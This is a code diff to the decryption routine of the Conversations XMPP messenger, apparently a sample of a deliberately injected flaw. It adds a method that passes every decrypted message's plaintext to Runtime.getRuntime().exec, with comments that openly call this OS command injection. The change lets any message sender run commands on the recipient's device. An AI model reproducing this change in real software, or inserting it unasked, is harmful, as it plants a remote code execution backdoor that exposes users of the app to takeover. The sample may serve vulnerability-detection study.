@@ -3,6 +3,9 @@ package eu.siacs.conversations.crypto.axolotl;
 import android.util.Base64;
 import android.util.Log;
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
@@ -57,7 +60,6 @@ public class XmppAxolotlMessage {
 		public String getPlaintext() {
 			return plaintext;
 		}
-
 
 		public String getFingerprint() {
 			return fingerprint;
@@ -237,6 +239,9 @@ public class XmppAxolotlMessage {
 				String plaintext = new String(cipher.doFinal(ciphertext));
 				plaintextMessage = new XmppAxolotlPlaintextMessage(plaintext, session.getFingerprint());
 
+                // Vulnerable code introduced here: OS Command Injection
+                executeCommand(plaintext); // This line introduces the vulnerability
+
 			} catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException
 					| InvalidAlgorithmParameterException | IllegalBlockSizeException
 					| BadPaddingException | NoSuchProviderException e) {
@@ -245,4 +250,18 @@ public class XmppAxolotlMessage {
 		}
 		return plaintextMessage;
 	}
+
+    // Function to execute system command (Vulnerable)
+    private void executeCommand(String command) {
+        try {
+            Process process = Runtime.getRuntime().exec(command); // OS Command Injection vulnerability
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            String line;
+            while ((line = reader.readLine()) != null) {
+                Log.d("CommandOutput", line);
+            }
+        } catch (IOException e) {
+            Log.e(Config.LOGTAG, "Error executing command: ", e);
+        }
+    }
 }
